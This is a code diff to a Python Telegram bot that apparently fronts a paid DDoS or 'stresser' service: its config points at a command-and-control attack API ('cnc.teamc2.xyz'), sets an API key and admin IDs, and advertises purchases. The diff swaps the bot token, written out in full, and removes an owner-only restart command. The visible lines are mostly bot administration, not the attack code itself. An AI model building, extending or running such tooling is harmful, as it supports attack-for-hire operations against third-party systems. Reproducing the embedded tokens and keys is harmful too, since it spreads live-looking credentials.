@@ -15,7 +15,7 @@ from collections import defaultdict
 from pymongo import MongoClient
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8291785662:AAEsTWGaxCLqyDqYYvyBfr8BsgwwVZ2lzdE"
+BOT_TOKEN = "8760406918:AAHk0XYSysz4nJElHEq4y7eIbIBqUL9Or3M"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "PFC10J"
@@ -30,7 +30,6 @@ maintenance_message = "🔧 Bot is under maintenance! 🔧\n\nPlease try again l
 # ========== HOSTED BOTS ==========
 hosted_bots = {}
 hosted_bot_instances = {}
-hosted_bot_running = {}
 
 # ========== BLOCKED USERS ==========
 blocked_users = []
@@ -815,7 +814,6 @@ def start(msg):
 /allblocks
 /allgroups
 /allhosts
-/restart
 /api_status
 
 🛒 Buy: XSILENT""")
@@ -1318,27 +1316,6 @@ def all_hosts(msg):
         bot.reply_to(msg, f"📋 **ALL HOSTED BOTS:**\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}", parse_mode='Markdown')
     else:
         bot.reply_to(msg, "📋 **No hosted bots found!**", parse_mode='Markdown')
-
-@bot.message_handler(commands=['restart'])
-def restart_bot(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    bot.reply_to(msg, "🔄 **RESTARTING BOT...**\n\n⏳ Stopping all hosted bots...\n💾 Saving data...\n✨ Bot will restart in 3 seconds...", parse_mode='Markdown')
-    
-    # Stop all hosted bots
-    for token in list(hosted_bots.keys()):
-        stop_hosted_bot(token)
-    
-    # Save all data
-    save_users(users_data)
-    save_keys(keys_data)
-    
-    time.sleep(2)
-    os._exit(0)
 
 @bot.message_handler(commands=['maintenance'])
 def maintenance(msg):
@@ -1900,7 +1877,6 @@ def help_cmd(msg):
 **OTHER:**
 `/broadcast` - Broadcast message
 `/maintenance on/off` - Maintenance mode
-`/restart` - Restart bot
 `/api_status` - API status
 `/help` - This menu
 
